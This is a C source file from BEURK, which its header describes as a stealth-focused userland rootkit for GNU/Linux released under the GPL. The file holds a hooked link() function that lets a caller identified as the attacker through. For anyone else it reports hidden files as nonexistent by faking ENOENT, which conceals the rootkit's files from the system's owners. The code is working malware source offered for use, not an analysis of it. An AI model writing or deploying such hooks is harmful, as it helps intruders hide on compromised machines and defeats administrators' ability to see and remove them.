/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <errno.h> /* errno, ENOENT */
#include "beurk.h" /* is_attacker(), is_hidden_file() */
#include "config.h" /* REAL_LINK() */
#include "debug.h" /* DEBUG() */
#include "hooks.h" /* prototype */

int link(const char *oldpath, const char *newpath) {
    init();
    DEBUG(D_INFO, "called link(2) hook");

    if (is_attacker())
        return (REAL_LINK(oldpath, newpath));

    if (is_hidden_file(oldpath) || is_hidden_file(newpath)) {
        errno = ENOENT;
        return (-1);
    }

    return (REAL_LINK(oldpath, newpath));
}
